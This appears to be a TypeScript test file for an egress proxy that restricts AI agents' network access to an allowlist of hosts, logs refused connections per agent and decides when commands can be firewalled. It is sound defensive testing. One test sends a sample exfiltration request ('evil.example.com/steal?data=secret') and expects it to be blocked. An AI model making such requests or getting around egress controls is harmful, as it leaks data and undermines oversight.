import { createServer as createHttpServer, request } from "node:http";
import { connect, createServer as createNetServer, type AddressInfo } from "node:net";

import { afterEach, describe, expect, it } from "vitest";

import {
  createEgressProxy,
  DEFAULT_SHELL_HOSTS,
  type EgressProxy,
  type EgressRefusal,
  hostAllowed,
  normalizeHostPattern,
  readAgentNetworkPolicy,
  readEgressPort,
  resolveAgentNetwork,
} from "./egress.js";

const cleanups: (() => Promise<void> | void)[] = [];
afterEach(async () => {
  for (const cleanup of cleanups.splice(0).reverse()) {
    await cleanup();
  }
});

async function startProxy(
  allow: readonly string[],
  refused: EgressRefusal[],
): Promise<{ proxy: EgressProxy; port: number }> {
  const proxy = createEgressProxy({
    allow: () => allow,
    port: 0,
    onRefused: (refusal) => refused.push(refusal),
    // Every allowed host "resolves" to loopback, where the test's upstream listens.
    resolver: async () => "127.0.0.1",
    ports: [443, 80, upstreamPort],
  });
  const port = await proxy.start();
  cleanups.push(() => proxy.stop());
  return { proxy, port };
}

let upstreamPort = 0;

/** Sends a CONNECT through the proxy; resolves to the status line and the open socket. */
function connectThrough(
  proxyPort: number,
  target: string,
  auth?: string,
): Promise<{ status: string; body: string; socket: ReturnType<typeof connect> }> {
  return new Promise((resolve, reject) => {
    const socket = connect(proxyPort, "127.0.0.1", () => {
      socket.write(
        `CONNECT ${target} HTTP/1.1\r\nhost: ${target}\r\n${auth === undefined ? "" : `proxy-authorization: Basic ${auth}\r\n`}\r\n`,
      );
    });
    let buffered = "";
    socket.on("data", (chunk) => {
      buffered += chunk.toString("utf8");
      const end = buffered.indexOf("\r\n\r\n");
      if (end >= 0) {
        socket.removeAllListeners("data");
        resolve({
          status: buffered.slice(0, buffered.indexOf("\r\n")),
          body: buffered.slice(end + 4),
          socket,
        });
      }
    });
    socket.on("error", reject);
  });
}

function basicFromProxyUrl(url: string): string {
  const parsed = new URL(url);
  return Buffer.from(`${parsed.username}:${parsed.password}`).toString("base64");
}

describe("the egress allowlist", () => {
  it("matches exact hosts and *. subdomains only", () => {
    expect(hostAllowed("github.com", DEFAULT_SHELL_HOSTS)).toBe(true);
    expect(hostAllowed("GitHub.com.", DEFAULT_SHELL_HOSTS)).toBe(true);
    expect(hostAllowed("raw.githubusercontent.com", DEFAULT_SHELL_HOSTS)).toBe(true);
    expect(hostAllowed("githubusercontent.com", DEFAULT_SHELL_HOSTS)).toBe(false);
    expect(hostAllowed("evilgithub.com", DEFAULT_SHELL_HOSTS)).toBe(false);
    expect(hostAllowed("github.com.evil.example", DEFAULT_SHELL_HOSTS)).toBe(false);
    expect(hostAllowed("example.com", DEFAULT_SHELL_HOSTS)).toBe(false);
  });

  it("checks allowlist entries", () => {
    expect(normalizeHostPattern(" *.Example.COM. ")).toBe("*.example.com");
    for (const bad of ["*", "http://x.com", "x.com/path", "a b", "*.*.x.com", ""]) {
      expect(() => normalizeHostPattern(bad)).toThrow(/not a host name/);
    }
  });

  it("reads its settings from the environment", () => {
    expect(readAgentNetworkPolicy({})).toBe("auto");
    expect(readAgentNetworkPolicy({ GENERIC_CORP_AGENT_NETWORK: "Required" })).toBe("required");
    expect(() => readAgentNetworkPolicy({ GENERIC_CORP_AGENT_NETWORK: "maybe" })).toThrow();
    expect(readEgressPort({})).toBe(3128);
    expect(readEgressPort({ GENERIC_CORP_EGRESS_PORT: "8888" })).toBe(8888);
    expect(() => readEgressPort({ GENERIC_CORP_EGRESS_PORT: "x" })).toThrow();
  });
});

describe("the egress proxy", () => {
  it("tunnels to allowed hosts and refuses and logs the rest, naming the agent", async () => {
    const upstream = createNetServer((socket) => socket.pipe(socket));
    await new Promise<void>((resolve) => upstream.listen(0, "127.0.0.1", () => resolve()));
    upstreamPort = (upstream.address() as AddressInfo).port;
    cleanups.push(() => new Promise<void>((resolve) => upstream.close(() => resolve())));
    const refused: EgressRefusal[] = [];
    const { proxy, port } = await startProxy(["registry.npmjs.org"], refused);
    const env = proxy.envFor("vp-research");
    expect(env["HTTPS_PROXY"]).toMatch(/^http:\/\/vp-research:[0-9a-f]{32}@127\.0\.0\.1:\d+$/);
    expect(env["NODE_USE_ENV_PROXY"]).toBe("1");
    const auth = basicFromProxyUrl(env["HTTPS_PROXY"] as string);

    const allowed = await connectThrough(port, `registry.npmjs.org:${upstreamPort}`, auth);
    expect(allowed.status).toBe("HTTP/1.1 200 Connection Established");
    const echoed = await new Promise<string>((resolve) => {
      allowed.socket.once("data", (chunk) => resolve(chunk.toString("utf8")));
      allowed.socket.write("ping");
    });
    expect(echoed).toBe("ping");
    allowed.socket.destroy();

    const blocked = await connectThrough(port, "evil.example.com:443", auth);
    expect(blocked.status).toBe("HTTP/1.1 403 Forbidden");
    expect(blocked.body).toContain("web_fetch");
    blocked.socket.destroy();

    const bareIp = await connectThrough(port, "1.1.1.1:443");
    expect(bareIp.status).toBe("HTTP/1.1 403 Forbidden");
    bareIp.socket.destroy();

    const badPort = await connectThrough(port, "registry.npmjs.org:22", "Zm9vOmJhcg==");
    expect(badPort.status).toBe("HTTP/1.1 403 Forbidden");
    badPort.socket.destroy();

    expect(refused).toEqual([
      {
        agentId: "vp-research",
        host: "evil.example.com",
        port: 443,
        method: "CONNECT",
        reason: "evil.example.com is not on the network allowlist",
      },
      {
        host: "1.1.1.1",
        port: 443,
        method: "CONNECT",
        reason: "connections to bare IP addresses are not allowed",
      },
      // A wrong token names no agent.
      { host: "registry.npmjs.org", port: 22, method: "CONNECT", reason: "port 22 is not allowed" },
    ]);
  });

  it("forwards plain HTTP to allowed hosts without the proxy credentials", async () => {
    const seen: Record<string, string | string[] | undefined>[] = [];
    const upstream = createHttpServer((req, res) => {
      seen.push(req.headers);
      res.end(`hello ${req.url}`);
    });
    await new Promise<void>((resolve) => upstream.listen(0, "127.0.0.1", () => resolve()));
    upstreamPort = (upstream.address() as AddressInfo).port;
    cleanups.push(() => new Promise<void>((resolve) => upstream.close(() => resolve())));
    const refused: EgressRefusal[] = [];
    const { proxy, port } = await startProxy(["pypi.org"], refused);
    const auth = basicFromProxyUrl(proxy.envFor("ceo")["HTTP_PROXY"] as string);

    const get = (url: string) =>
      new Promise<{ status: number; body: string }>((resolve, reject) => {
        const req = request(
          {
            host: "127.0.0.1",
            port,
            path: url,
            headers: { "proxy-authorization": `Basic ${auth}` },
          },
          (res) => {
            let body = "";
            res.on("data", (chunk) => {
              body += chunk;
            });
            res.on("end", () => resolve({ status: res.statusCode ?? 0, body }));
          },
        );
        req.on("error", reject);
        req.end();
      });

    expect(await get(`http://pypi.org:${upstreamPort}/simple/?q=1`)).toEqual({
      status: 200,
      body: "hello /simple/?q=1",
    });
    expect(seen[0]?.["host"]).toBe(`pypi.org:${upstreamPort}`);
    expect(seen[0]?.["proxy-authorization"]).toBeUndefined();
    const blocked = await get("http://evil.example.com/steal?data=secret");
    expect(blocked.status).toBe(403);
    expect(refused).toEqual([
      {
        agentId: "ceo",
        host: "evil.example.com",
        port: 80,
        method: "GET",
        reason: "evil.example.com is not on the network allowlist",
      },
    ]);
  });

  it("reads the allowlist on every connection, so changes apply at once", async () => {
    let allow: readonly string[] = [];
    const refused: EgressRefusal[] = [];
    const proxy = createEgressProxy({
      allow: () => allow,
      port: 0,
      onRefused: (refusal) => refused.push(refusal),
      resolver: async () => {
        throw new Error("no network in tests");
      },
    });
    const port = await proxy.start();
    cleanups.push(() => proxy.stop());
    (await connectThrough(port, "github.com:443")).socket.destroy();
    allow = ["github.com"];
    (await connectThrough(port, "github.com:443")).socket.destroy();
    expect(refused.map((refusal) => refusal.reason)).toEqual([
      "github.com is not on the network allowlist",
      "no network in tests",
    ]);
  });
});

describe("deciding how agent commands reach the network", () => {
  const isolation = { mode: "user" as const, user: "agent", runAs: { user: "agent" } };

  it("is walled when the probe finds the firewall rule, and proxy-only otherwise", async () => {
    expect(await resolveAgentNetwork("auto", isolation, async () => undefined)).toEqual({
      mode: "walled",
    });
    expect(await resolveAgentNetwork("auto", isolation, async () => "no rule")).toEqual({
      mode: "proxy-only",
      reason: "no rule",
    });
    await expect(resolveAgentNetwork("required", isolation, async () => "no rule")).rejects.toThrow(
      /GENERIC_CORP_AGENT_NETWORK is required but no rule/,
    );
    expect((await resolveAgentNetwork("off", isolation, async () => "unused")).mode).toBe("open");
  });

  it("cannot wall commands that run as the server's own user", async () => {
    const network = await resolveAgentNetwork("auto", { mode: "shared" });
    expect(network.mode).toBe("proxy-only");
    expect(network.reason).toMatch(/server's own user/);
  });
});
